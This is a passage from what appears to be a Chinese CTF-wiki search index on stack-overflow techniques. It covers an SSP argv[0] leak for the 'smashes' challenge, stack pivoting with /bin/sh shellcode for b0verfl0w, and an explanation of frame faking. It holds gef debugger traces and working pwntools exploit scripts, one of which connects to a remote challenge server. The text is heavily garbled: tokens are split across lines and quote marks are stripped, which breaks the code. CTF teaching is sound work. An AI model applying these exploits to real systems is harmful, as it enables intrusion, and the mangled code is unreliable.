\n\ngef\n\u27a4\n  \ngrep\n \nPCTF\n\n\n[+]\n \nSearching\n \nPCTF\n \nin\n \nmemory\n\n\n[+]\n \nIn\n \n/\nmnt\n/\nhgfs\n/\nHack\n/\nctf\n/\nctf-wiki\n/\npwn\n/\nstackoverflow\n/\nexample\n/\nstacksmashes\n/\nsmashes\n(\n0x400000\n-\n0x401000\n),\n \npermission\n=\nr-x\n\n  \n0\nx400d20\n \n-\n \n0x400d3f\n  \n\u2192\n   \nPCTF\n{\nHere\ns\n \nthe\n \nflag\n \non\n \nserver\n}\n \n\n\n\n\n\u53ef\u4ee5\u770b\u51fa\u6211\u4eec\u8bfb\u5165\u76842222\u5df2\u7ecf\u8986\u76d6\u4e860x600d20\u5904\u7684flag\uff0c\u4f46\u662f\u6211\u4eec\u5728\u5185\u5b58\u76840x400d20\u5904\u4ecd\u7136\u627e\u5230\u4e86\u8fd9\u4e2aflag\u7684\u5907\u4efd\uff0c\u6240\u4ee5\u6211\u4eec\u8fd8\u662f\u53ef\u4ee5\u5c06\u5176\u8f93\u51fa\u3002\u8fd9\u91cc\u6211\u4eec\u5df2\u7ecf\u786e\u5b9a\u4e86flag\u7684\u5730\u5740\u3002\n\n\n\u786e\u5b9a\u504f\u79fb\n\n\n\u4e0b\u9762\uff0c\u6211\u4eec\u786e\u5b9aargv[0]\u8ddd\u79bb\u8bfb\u53d6\u7684\u5b57\u7b26\u4e32\u7684\u504f\u79fb\u3002\n\n\n\u9996\u5148\u4e0b\u65ad\u70b9\u5728main\u51fd\u6570\u5165\u53e3\u5904\uff0c\u5982\u4e0b\n\n\ngef\n\u27a4\n  \nb\n \n*\n0x00000000004006D0\n\n\nBreakpoint\n \n1\n \nat\n \n0x4006d0\n\n\ngef\n\u27a4\n  \nr\n\n\nStarting\n \nprogram\n:\n \n/\nmnt\n/\nhgfs\n/\nHack\n/\nctf\n/\nctf-wiki\n/\npwn\n/\nstackoverflow\n/\nexample\n/\nstacksmashes\n/\nsmashes\n \n\n\nBreakpoint\n \n1\n,\n \n0x00000000004006d0\n \nin\n \n??\n \n()\n\n \ncode:i386:\nx86-64\n \n]\n\u2500\u2500\u2500\u2500\n\n     \n0\nx4006c0\n \n_IO_gets@plt\n+\n0\n \njmp\n    \nQWORD\n \nPTR\n \n[\nrip\n+\n0x20062a\n]\n        \n# 0x600cf0 \n_IO_gets@got.plt\n\n     \n0x4006c6\n \n_IO_gets@plt\n+\n6\n \npush\n   \n0x9\n\n     \n0\nx4006cb\n \n_IO_gets@plt\n+\n11\n \njmp\n    \n0x400620\n\n \n\u2192\n   \n0\nx4006d0\n                  \nsub\n    \nrsp\n,\n \n0x8\n\n     \n0\nx4006d4\n                  \nmov\n    \nrdi\n,\n \nQWORD\n \nPTR\n \n[\nrip\n+\n0x200665\n]\n        \n# 0x600d40 \nstdout\n\n     \n0x4006db\n                  \nxor\n    \nesi\n,\n \nesi\n\n     \n0\nx4006dd\n                  \ncall\n   \n0x400660\n \nsetbuf@plt\n\n\n\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500[\n \nstack\n \n]\n\u2500\u2500\u2500\u2500\n\n\n[\n0\nx7fffffffdb78\n,\n \nl8\n]\n\n\n8\n\n\n0\nx00007fffffffdb78\n\u2502+\n0x00\n:\n \n0x00007ffff7a2d830\n  \n\u2192\n  \n__libc_start_main\n+\n240\n \nmov\n \nedi\n,\n \neax\n    \n\u2190\n \n$rsp\n\n\n0\nx00007fffffffdb80\n\u2502+\n0x08\n:\n \n0x0000000000000000\n\n\n0\nx00007fffffffdb88\n\u2502+\n0x10\n:\n \n0x00007fffffffdc58\n  \n\u2192\n  \n0x00007fffffffe00b\n  \n\u2192\n  \n/\nmnt\n/\nhgfs\n/\nHack\n/\nctf\n/\nctf-wiki\n/\npwn\n/\nstackoverflow\n/\nexam\n[...]\n\n\n0\nx00007fffffffdb90\n\u2502+\n0x18\n:\n \n0x0000000100000000\n\n\n0\nx00007fffffffdb98\n\u2502+\n0x20\n:\n \n0x00000000004006d0\n  \n\u2192\n   \nsub\n \nrsp\n,\n \n0x8\n\n\n0\nx00007fffffffdba0\n\u2502+\n0x28\n:\n \n0x0000000000000000\n\n\n0\nx00007fffffffdba8\n\u2502+\n0x30\n:\n \n0x48c916d3cf726fe3\n\n\n0\nx00007fffffffdbb0\n\u2502+\n0x38\n:\n \n0x00000000004006ee\n  \n\u2192\n   \nxor\n \nebp\n,\n \nebp\n\n\n\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500[\n \ntrace\n \n]\n\u2500\u2500\u2500\u2500\n\n\n[\n#0] 0x4006d0 \u2192 sub rsp, 0x8\n\n\n[\n#1] 0x7ffff7a2d830 \u2192 Name: __libc_start_main(main=0x4006d0, argc=0x1, argv=0x7fffffffdc58, init=\noptimized out\n, fini=\noptimized out\n, rtld_fini=\noptimized out\n, stack_end=0x7fffffffdc48)\n\n\n---\nType\n \nreturn\n \nto\n \ncontinue\n,\n \nor\n \nq\n \nreturn\n \nto\n \nquit---\n\n\n[\n#2] 0x400717 \u2192 hlt \n\n\n\n\n\n\u53ef\u4ee5\u770b\u51fa0x00007fffffffe00b\u6307\u5411\u7a0b\u5e8f\u540d\uff0c\u5176\u81ea\u7136\u5c31\u662fargv[0]\uff0c\u6240\u4ee5\u6211\u4eec\u4fee\u6539\u7684\u5185\u5bb9\u5c31\u662f\u8fd9\u4e2a\u5730\u5740\u3002\u540c\u65f60x00007fffffffdc58\u5904\u4fdd\u7559\u7740\u8be5\u5730\u5740\uff0c\u6240\u4ee5\u6211\u4eec\u771f\u6b63\u9700\u8981\u7684\u5730\u5740\u662f0x00007fffffffdc58\u3002\n\n\n\u6b64\u5916\uff0c\u6839\u636e\u6c47\u7f16\u4ee3\u7801\n\n\n.text:\n00000000004007\nE0\n                 \npush\n    \nrbp\n\n\n.text:\n00000000004007\nE1\n                 \nmov\n     \nesi\n,\n \noffset\n \naHelloWhatSYour\n \n; \nHello!\\nWhat\ns your name? \n\n\n.text\n:\n00000000004007\nE6\n                 \nmov\n     \nedi\n,\n \n1\n\n\n.text:\n00000000004007\nEB\n                 \npush\n    \nrbx\n\n\n.text:\n00000000004007\nEC\n                 \nsub\n     \nrsp\n,\n \n118\nh\n\n\n.text:\n00000000004007\nF3\n                 \nmov\n     \nrax\n,\n \nfs\n:\n28\nh\n\n\n.text:\n00000000004007\nFC\n                 \nmov\n     \n[\nrsp\n+\n128\nh\n+\nvar_20\n],\n \nrax\n\n\n.text:\n0000000000400804\n                 \nxor\n     \neax\n,\n \neax\n\n\n.text:\n0000000000400806\n                 \ncall\n    \n___printf_chk\n\n\n.text:\n000000000040080\nB\n                 \nmov\n     \nrdi\n,\n \nrsp\n\n\n.text:\n000000000040080\nE\n                 \ncall\n    \n__IO_gets\n\n\n\n\n\n\u6211\u4eec\u53ef\u4ee5\u786e\u5b9a\u6211\u4eec\u8bfb\u5165\u7684\u5b57\u7b26\u4e32\u7684\u8d77\u59cb\u5730\u5740\u5176\u5b9e\u5c31\u662f\u8c03\u7528__IO_gets\u4e4b\u524d\u7684rsp\uff0c\u6240\u4ee5\u6211\u4eec\u628a\u65ad\u70b9\u4e0b\u5728call\u5904\uff0c\u5982\u4e0b\n\n\ngef\n\u27a4\n  \nb\n \n*\n0x000000000040080E\n\n\nBreakpoint\n \n2\n \nat\n \n0x40080e\n\n\ngef\n\u27a4\n  \nc\n\n\nContinuing.\n\n\nHello\n!\n\n\nWhat\ns\n \nyour\n \nname\n?\n \n\nBreakpoint\n \n2\n,\n \n0x000000000040080e\n \nin\n \n??\n \n()\n\n\n\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500[\n \ncode:i386:\nx86-64\n \n]\n\u2500\u2500\u2500\u2500\n\n     \n0\nx400804\n                  \nxor\n    \neax\n,\n \neax\n\n     \n0\nx400806\n                  \ncall\n   \n0x4006b0\n \n__printf_chk@plt\n\n     \n0\nx40080b\n                  \nmov\n    \nrdi\n,\n \nrsp\n\n \n\u2192\n   \n0\nx40080e\n                  \ncall\n   \n0x4006c0\n \n_IO_gets@plt\n\n   \n\u21b3\n    \n0\nx4006c0\n \n_IO_gets@plt\n+\n0\n \njmp\n    \nQWORD\n \nPTR\n \n[\nrip\n+\n0x20062a\n]\n        \n# 0x600cf0 \n_IO_gets@got.plt\n\n        \n0x4006c6\n \n_IO_gets@plt\n+\n6\n \npush\n   \n0x9\n\n        \n0\nx4006cb\n \n_IO_gets@plt\n+\n11\n \njmp\n    \n0x400620\n\n        \n0\nx4006d0\n                  \nsub\n    \nrsp\n,\n \n0x8\n\n\n\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500[\n \nstack\n \n]\n\u2500\u2500\u2500\u2500\n\n\n[\n0\nx7fffffffda40\n,\n \nl8\n]\n\n\n8\n\n\n0\nx00007fffffffda40\n\u2502+\n0x00\n:\n \n0x0000ff0000000000\n     \n\u2190\n \n$rsp\n,\n \n$rdi\n\n\n0\nx00007fffffffda48\n\u2502+\n0x08\n:\n \n0x0000000000000000\n\n\n0\nx00007fffffffda50\n\u2502+\n0x10\n:\n \n0x0000000000000000\n\n\n0\nx00007fffffffda58\n\u2502+\n0x18\n:\n \n0x0000000000000000\n\n\n0\nx00007fffffffda60\n\u2502+\n0x20\n:\n \n0x0000000000000000\n\n\n0\nx00007fffffffda68\n\u2502+\n0x28\n:\n \n0x0000000000000000\n\n\n0\nx00007fffffffda70\n\u2502+\n0x30\n:\n \n0x0000000000000000\n\n\n0\nx00007fffffffda78\n\u2502+\n0x38\n:\n \n0x0000000000000000\n\n\n\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500[\n \ntrace\n \n]\n\u2500\u2500\u2500\u2500\n\n\n[\n#0] 0x40080e \u2192 call 0x4006c0 \n_IO_gets@plt\n\n\n\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\n\n\ngef\n\u27a4\n  \nprint\n \n$rsp\n\n\n$1\n \n=\n \n(\nvoid\n \n*)\n \n0x7fffffffda40\n\n\n\n\n\n\u53ef\u4ee5\u770b\u51farsp\u7684\u503c\u4e3a0x7fffffffda40\uff0c\u90a3\u4e48\u76f8\u5bf9\u504f\u79fb\u4e3a\n\n\n \n0x00007fffffffdc58\n-\n0x7fffffffda40\n\n\n536\n\n\n \nhex\n(\n536\n)\n\n\n0x218\n\n\n\n\n\n\u5229\u7528\u7a0b\u5e8f\n\n\n\u6211\u4eec\u6784\u9020\u5229\u7528\u7a0b\u5e8f\u5982\u4e0b\n\n\nfrom\n \npwn\n \nimport\n \n*\n\n\ncontext\n.\nlog_level\n \n=\n \ndebug\n\n\nsmash\n \n=\n \nELF\n(\n./smashes\n)\n\n\nif\n \nargs\n[\nREMOTE\n]:\n\n    \nsh\n \n=\n \nremote\n(\npwn.jarvisoj.com\n,\n \n9877\n)\n\n\nelse\n:\n\n    \nsh\n \n=\n \nprocess\n(\n./smashes\n)\n\n\nargv_addr\n \n=\n \n0x00007fffffffdc58\n\n\nname_addr\n \n=\n \n0x7fffffffda40\n\n\nflag_addr\n \n=\n \n0x600D20\n\n\nanother_flag_addr\n \n=\n \n0x400d20\n\n\npayload\n \n=\n \na\n \n*\n \n(\nargv_addr\n \n-\n \nname_addr\n)\n \n+\n \np64\n(\nanother_flag_addr\n)\n\n\nsh\n.\nrecvuntil\n(\nname? \n)\n\n\nsh\n.\nsendline\n(\npayload\n)\n\n\nsh\n.\nrecvuntil\n(\nflag: \n)\n\n\nsh\n.\nsendline\n(\nbb\n)\n\n\ndata\n \n=\n \nsh\n.\nrecv\n()\n\n\nsh\n.\ninteractive\n()\n\n\n\n\n\n\u8fd9\u91cc\u6211\u4eec\u76f4\u63a5\u5c31\u5f97\u5230\u4e86flag\uff0c\u6ca1\u6709\u51fa\u73b0\u7f51\u4e0a\u8bf4\u7684\u5f97\u4e0d\u5230flag\u7684\u60c5\u51b5\u3002\n\n\n\u9898\u76ee", 
            "title": "\u82b1\u5f0f\u6808\u6ea2\u51fa\u6280\u5de7"
        }, 
        {
            "location": "/pwn/stackoverflow/others/#_1", 
            "text": "", 
            "title": "\u82b1\u5f0f\u6808\u6ea2\u51fa\u6280\u5de7"
        }, 
        {
            "location": "/pwn/stackoverflow/others/#stack-pivoting", 
            "text": "", 
            "title": "stack pivoting"
        }, 
        {
            "location": "/pwn/stackoverflow/others/#_2", 
            "text": "stack pivoting\uff0c\u6b63\u5982\u5b83\u6240\u63cf\u8ff0\u7684\uff0c\u8be5\u6280\u5de7\u5c31\u662f\u52ab\u6301\u6808\u6307\u9488\u6307\u5411\u653b\u51fb\u8005\u6240\u80fd\u63a7\u5236\u7684\u5185\u5b58\u5904\uff0c\u7136\u540e\u518d\u5728\u76f8\u5e94\u7684\u4f4d\u7f6e\u8fdb\u884cROP\u3002\u4e00\u822c\u6765\u8bf4\uff0c\u6211\u4eec\u53ef\u80fd\u5728\u4ee5\u4e0b\u60c5\u51b5\u9700\u8981\u4f7f\u7528stack pivoting   \u53ef\u4ee5\u63a7\u5236\u7684\u6808\u6ea2\u51fa\u7684\u5b57\u8282\u6570\u8f83\u5c11\uff0c\u96be\u4ee5\u6784\u9020\u8f83\u957f\u7684ROP\u94fe  \u5f00\u542f\u4e86PIE\u4fdd\u62a4\uff0c\u6808\u5730\u5740\u672a\u77e5\uff0c\u6211\u4eec\u53ef\u4ee5\u5c06\u6808\u52ab\u6301\u5230\u5df2\u77e5\u7684\u533a\u57df\u3002  \u5176\u5b83\u6f0f\u6d1e\u96be\u4ee5\u5229\u7528\uff0c\u6211\u4eec\u9700\u8981\u8fdb\u884c\u8f6c\u6362\uff0c\u6bd4\u5982\u8bf4\u5c06\u6808\u52ab\u6301\u5230\u5806\u7a7a\u95f4\uff0c\u4ece\u800c\u5229\u7528\u5806\u6f0f\u6d1e   \u6b64\u5916\uff0c\u5229\u7528stack pivoting\u6709\u4ee5\u4e0b\u51e0\u4e2a\u8981\u6c42    \u53ef\u4ee5\u63a7\u5236\u7a0b\u5e8f\u6267\u884c\u6d41\u3002    \u53ef\u4ee5\u63a7\u5236sp\u6307\u9488\u3002\u4e00\u822c\u6765\u8bf4\uff0c\u63a7\u5236\u6808\u6307\u9488\u4f1a\u4f7f\u7528ROP\uff0c\u5e38\u89c1\u7684\u63a7\u5236\u6808\u6307\u9488\u7684gadgets\u4e00\u822c\u662f    pop   rsp / esp   \u5f53\u7136\uff0c\u8fd8\u4f1a\u6709\u4e00\u4e9b\u5176\u5b83\u7684\u59ff\u52bf\u3002\u6bd4\u5982\u8bf4libc_csu_init\u4e2d\u7684gadgets\uff0c\u6211\u4eec\u901a\u8fc7\u504f\u79fb\u5c31\u53ef\u4ee5\u5f97\u5230\u63a7\u5236rsp\u6307\u9488\u3002\u4e0a\u9762\u7684\u662f\u6b63\u5e38\u7684\uff0c\u4e0b\u9762\u7684\u662f\u504f\u79fb\u7684\u3002  gef \u27a4    x / 7 i   0x000000000040061a  0 x40061a   __libc_csu_init + 90 :    pop      rbx  0 x40061b   __libc_csu_init + 91 :    pop      rbp  0 x40061c   __libc_csu_init + 92 :    pop      r12  0 x40061e   __libc_csu_init + 94 :    pop      r13  0 x400620   __libc_csu_init + 96 :    pop      r14  0 x400622   __libc_csu_init + 98 :    pop      r15  0 x400624   __libc_csu_init + 100 :   ret      gef \u27a4    x / 7 i   0x000000000040061d  0 x40061d   __libc_csu_init + 93 :    pop      rsp  0 x40061e   __libc_csu_init + 94 :    pop      r13  0 x400620   __libc_csu_init + 96 :    pop      r14  0 x400622   __libc_csu_init + 98 :    pop      r15  0 x400624   __libc_csu_init + 100 :   ret   \u6b64\u5916\uff0c\u8fd8\u6709\u66f4\u52a0\u9ad8\u7ea7\u7684fake frame\u3002   \u5b58\u5728\u53ef\u4ee5\u63a7\u5236\u5185\u5bb9\u7684\u5185\u5b58\uff0c\u4e00\u822c\u6709\u5982\u4e0b  bss\u6bb5\u3002\u7531\u4e8e\u8fdb\u7a0b\u6309\u9875\u5206\u914d\u5185\u5b58\uff0c\u5206\u914d\u7ed9bss\u6bb5\u7684\u5185\u5b58\u5927\u5c0f\u81f3\u5c11\u4e00\u4e2a\u9875(4k,0x1000)\u5927\u5c0f\u3002\u7136\u800c\u4e00\u822cbss\u6bb5\u7684\u5185\u5bb9\u7528\u4e0d\u4e86\u8fd9\u4e48\u591a\u7684\u7a7a\u95f4\uff0c\u5e76\u4e14bss\u6bb5\u5206\u914d\u7684\u5185\u5b58\u9875\u62e5\u6709\u8bfb\u5199\u6743\u9650\u3002  heap\u3002\u4f46\u662f\u8fd9\u4e2a\u9700\u8981\u6211\u4eec\u80fd\u591f\u6cc4\u9732\u5806\u5730\u5740\u3002", 
            "title": "\u539f\u7406"
        }, 
        {
            "location": "/pwn/stackoverflow/others/#_3", 
            "text": "", 
            "title": "\u793a\u4f8b"
        }, 
        {
            "location": "/pwn/stackoverflow/others/#1", 
            "text": "\u8fd9\u91cc\u6211\u4eec\u4ee5 X-CTF Quals 2016 - b0verfl0w \u4e3a\u4f8b\uff0c\u8fdb\u884c\u4ecb\u7ecd\u3002\u9996\u5148\uff0c\u67e5\u770b\u7a0b\u5e8f\u7684\u5b89\u5168\u4fdd\u62a4\uff0c\u5982\u4e0b  \u279c  X-CTF Quals  2016  - b0verfl0w git: ( iromise )  \u2717 checksec b0verfl0w                 \n    Arch:     i386-32-little\n    RELRO:    Partial RELRO\n    Stack:    No canary found\n    NX:       NX disabled\n    PIE:      No PIE  ( 0x8048000 ) \n    RWX:      Has RWX segments  \u53ef\u4ee5\u770b\u51fa\u6e90\u7a0b\u5e8f\u4e3a32\u4f4d\uff0c\u4e5f\u6ca1\u6709\u5f00\u542fNX\u4fdd\u62a4\uff0c\u4e0b\u9762\u6211\u4eec\u6765\u627e\u4e00\u4e0b\u7a0b\u5e8f\u7684\u6f0f\u6d1e  signed   int   vul ()  { \n   char   s ;   // [sp+18h] [bp-20h]@1 \n\n   puts ( \\n ====================== ); \n   puts ( \\n Welcome to X-CTF 2016! ); \n   puts ( \\n ====================== ); \n   puts ( What s your name? ); \n   fflush ( stdout ); \n   fgets ( s ,   50 ,   stdin ); \n   printf ( Hello %s. ,   s ); \n   fflush ( stdout ); \n   return   1 ;  }   \u53ef\u4ee5\u770b\u51fa\uff0c\u6e90\u7a0b\u5e8f\u5b58\u5728\u6808\u6ea2\u51fa\u6f0f\u6d1e\u3002\u4f46\u662f\u5176\u6240\u80fd\u6ea2\u51fa\u7684\u5b57\u8282\u5c31\u53ea\u670950-0x20-4=14\u4e2a\u5b57\u8282\uff0c\u6240\u4ee5\u6211\u4eec\u5f88\u96be\u6267\u884c\u4e00\u4e9b\u6bd4\u8f83\u597d\u7684ROP\u3002\u8fd9\u91cc\u6211\u4eec\u5c31\u8003\u8651stack pivoting\u3002\u7531\u4e8e\u7a0b\u5e8f\u672c\u8eab\u5e76\u6ca1\u6709\u5f00\u542f\u5806\u6808\u4fdd\u62a4\uff0c\u6240\u4ee5\u6211\u4eec\u53ef\u4ee5\u5728\u6808\u4e0a\u5e03\u7f6eshellcode\u5e76\u6267\u884c\u3002\u57fa\u672c\u5229\u7528\u601d\u8def\u5982\u4e0b   \u5229\u7528\u6808\u6ea2\u51fa\u5e03\u7f6eshellcode  \u63a7\u5236eip\u6307\u5411shellcode\u5904   \u7b2c\u4e00\u6b65\uff0c\u8fd8\u662f\u6bd4\u8f83\u5bb9\u6613\u5730\uff0c\u76f4\u63a5\u8bfb\u53d6\u5373\u53ef\uff0c\u4f46\u662f\u7531\u4e8e\u7a0b\u5e8f\u672c\u8eab\u4f1a\u5f00\u542fASLR\u4fdd\u62a4\uff0c\u6240\u4ee5\u6211\u4eec\u5f88\u96be\u76f4\u63a5\u77e5\u9053shellcode\u7684\u5730\u5740\u3002\u4f46\u662f\u6808\u4e0a\u76f8\u5bf9\u504f\u79fb\u662f\u56fa\u5b9a\u7684\uff0c\u6240\u4ee5\u6211\u4eec\u53ef\u4ee5\u5229\u7528\u6808\u6ea2\u51fa\u5bf9esp\u8fdb\u884c\u64cd\u4f5c\uff0c\u4f7f\u5176\u6307\u5411shellcode\u5904\uff0c\u5e76\u4e14\u76f4\u63a5\u63a7\u5236\u7a0b\u5e8f\u8df3\u8f6c\u81f3esp\u5904\u3002\u90a3\u4e0b\u9762\u5c31\u662f\u627e\u63a7\u5236\u7a0b\u5e8f\u8df3\u8f6c\u5230esp\u5904\u7684gadgets\u4e86\u3002  \u279c  X-CTF Quals  2016  - b0verfl0w git: ( iromise )  \u2717 ROPgadget --binary b0verfl0w --only  jmp|ret          \nGadgets  information  ============================================================ \n0x08048504 : jmp esp\n0x0804836a : ret\n0x0804847e : ret 0xeac1\n\nUnique gadgets found:  3   \u8fd9\u91cc\u6211\u4eec\u53d1\u73b0\u6709\u4e00\u4e2a\u53ef\u4ee5\u76f4\u63a5\u8df3\u8f6c\u5230esp\u7684gadgets\u3002\u90a3\u4e48\u6211\u4eec\u53ef\u4ee5\u5e03\u7f6epayload\u5982\u4e0b  shellcode|padding|fake ebp|0x08048504|set esp point to shellcode and jmp esp  \u90a3\u4e48\u6211\u4eecpayload\u4e2d\u7684\u6700\u540e\u4e00\u90e8\u5206\u6539\u5982\u4f55\u8bbe\u7f6eesp\u5462\uff0c\u53ef\u4ee5\u77e5\u9053   size(shellcode+padding)=0x20  size(fake ebp)=0x4  size(0x08048504)=0x4   \u6240\u4ee5\u6211\u4eec\u6700\u540e\u4e00\u6bb5\u9700\u8981\u6267\u884c\u7684\u6307\u4ee4\u5c31\u662f  sub   0x28 , esp  jmp   esp   \u6240\u4ee5\u6700\u540e\u7684exp\u5982\u4e0b  from   pwn   import   *  sh   =   process ( ./b0verfl0w )  shellcode_x86   =   \\x31\\xc9\\xf7\\xe1\\x51\\x68\\x2f\\x2f\\x73  shellcode_x86   +=   \\x68\\x68\\x2f\\x62\\x69\\x6e\\x89\\xe3\\xb0  shellcode_x86   +=   \\x0b\\xcd\\x80  sub_esp_jmp   =   asm ( sub esp, 0x28;jmp esp )  jmp_esp   =   0x08048504  payload   =   shellcode_x86   +   ( \n     0x20   -   len ( shellcode_x86 ))   *   b   +   bbbb   +   p32 ( jmp_esp )   +   sub_esp_jmp  sh . sendline ( payload )  sh . interactive ()", 
            "title": "\u4f8b1"
        }, 
        {
            "location": "/pwn/stackoverflow/others/#2-", 
            "text": "\u5f85\u3002", 
            "title": "\u4f8b2-\u8f6c\u79fb\u5806"
        }, 
        {
            "location": "/pwn/stackoverflow/others/#_4", 
            "text": "EkoPartyCTF 2016 fuckzing-exploit-200", 
            "title": "\u9898\u76ee"
        }, 
        {
            "location": "/pwn/stackoverflow/others/#frame-faking", 
            "text": "\u6b63\u5982\u8fd9\u4e2a\u6280\u5de7\u540d\u5b57\u6240\u8bf4\u7684\u90a3\u6837\uff0c\u8fd9\u4e2a\u6280\u5de7\u5c31\u662f\u6784\u9020\u4e00\u4e2a\u865a\u5047\u7684\u6808\u5e27\u6765\u63a7\u5236\u7a0b\u5e8f\u7684\u6267\u884c\u6d41\u3002", 
            "title": "frame faking"
        }, 
        {
            "location": "/pwn/stackoverflow/others/#_5", 
            "text": "\u6982\u62ec\u5730\u8bb2\uff0c\u6211\u4eec\u5728\u4e4b\u524d\u8bb2\u7684\u6808\u6ea2\u51fa\u4e0d\u5916\u4e4e\u4e24\u79cd\u65b9\u5f0f   \u63a7\u5236\u7a0b\u5e8fEIP  \u63a7\u5236\u7a0b\u5e8fEBP   \u5176\u6700\u7ec8\u90fd\u662f\u63a7\u5236\u7a0b\u5e8f\u7684\u6267\u884c\u6d41\u3002\u5728frame faking\u4e2d\uff0c\u6211\u4eec\u6240\u5229\u7528\u7684\u6280\u5de7\u4fbf\u662f\u540c\u65f6\u63a7\u5236EBP\u4e0eEIP\uff0c\u8fd9\u6837\u6211\u4eec\u5728\u63a7\u5236\u7a0b\u5e8f\u6267\u884c\u6d41\u7684\u540c\u65f6\uff0c\u4e5f\u6539\u53d8\u7a0b\u5e8f\u6808\u5e27\u7684\u4f4d\u7f6e\u3002\u4e00\u822c\u6765\u8bf4\u5176payload\u5982\u4e0b  buffer padding|fake ebp|leave ret addr|  \u5373\u6211\u4eec\u5229\u7528\u6808\u6ea2\u51fa\u5c06\u6808\u4e0a\u6784\u9020\u4e3a\u5982\u4e0a\u683c\u5f0f\u3002\u8fd9\u91cc\u6211\u4eec\u4e3b\u8981\u63a5\u4e0b\u540e\u9762\u4e24\u4e2a\u90e8\u5206   \u51fd\u6570\u7684\u8fd4\u56de\u5730\u5740\u88ab\u6211\u4eec\u8986\u76d6\u4e3a\u6267\u884cleave ret\u7684\u5730\u5740\uff0c\u8fd9\u5c31\u8868\u660e\u4e86\u51fd\u6570\u5728\u6b63\u5e38\u6267\u884c\u5b8c\u81ea\u5df1\u7684leave ret\u540e\uff0c\u8fd8\u4f1a\u518d\u6b21\u6267\u884c\u4e00\u6b21leave ret\u3002  \u5176\u4e2dfake ebp\u4e3a\u6211\u4eec\u6784\u9020\u7684\u6808\u5e27\u7684\u57fa\u5730\u5740\uff0c\u9700\u8981\u6ce8\u610f\u7684\u662f\u8fd9\u91cc\u662f\u4e00\u4e2a\u5730\u5740\u3002\u4e00\u822c\u6765\u8bf4\u6211\u4eec\u6784\u9020\u7684\u5047\u7684\u6808\u5e27\u5982\u4e0b   fake ebp\n|\nv\nebp2|target function addr|leave ret addr|arg1|arg2  \u8fd9\u91cc\u6211\u4eec\u7684fake ebp\u6307\u5411ebp2\uff0c\u5373\u5b83\u4e3aebp2\u6240\u5728\u7684\u5730\u5740\u3002\u901a\u5e38\u6765\u8bf4\uff0c\u8fd9\u91cc\u90fd\u662f\u6211\u4eec\u80fd\u591f\u63a7\u5236\u7684\u53ef\u8bfb\u7684\u5185\u5bb9\u3002  \u4e0b\u9762\u7684\u6c47\u7f16\u8bed\u6cd5\u662f AT T \u8bed\u6cd5\u3002  \u5728\u6211\u4eec\u4ecb\u7ecd\u57fa\u672c\u7684\u63a7\u5236\u8fc7\u7a0b\u4e4b\u524d\uff0c\u6211\u4eec\u8fd8\u662f\u6709\u5fc5\u8981\u8bf4\u4e00\u4e0b\uff0c\u51fd\u6570\u7684\u5165\u53e3\u70b9\u4e0e\u51fa\u53e3\u70b9\u7684\u57fa\u672c\u64cd\u4f5c  \u5165\u53e3\u70b9  push ebp  # \u5c06ebp\u538b\u6808\nmove esp, ebp #\u5c06esp\u7684\u503c\u8d4b\u7ed9ebp  \u51fa\u53e3\u70b9  leave\nret #pop eip\uff0c\u5f39\u51fa\u6808\u9876\u5143\u7d20\u4f5c\u4e3a\u7a0b\u5e8f\u4e0b\u4e00\u4e2a\u6267\u884c\u5730\u5740  \u5176\u4e2dleave\u6307\u4ee4\u76f8\u5f53\u4e8e  move ebp, esp # \u5c06ebp\u7684\u503c\u8d4b\u7ed9esp\npop ebp #\u5f39\u51faebp  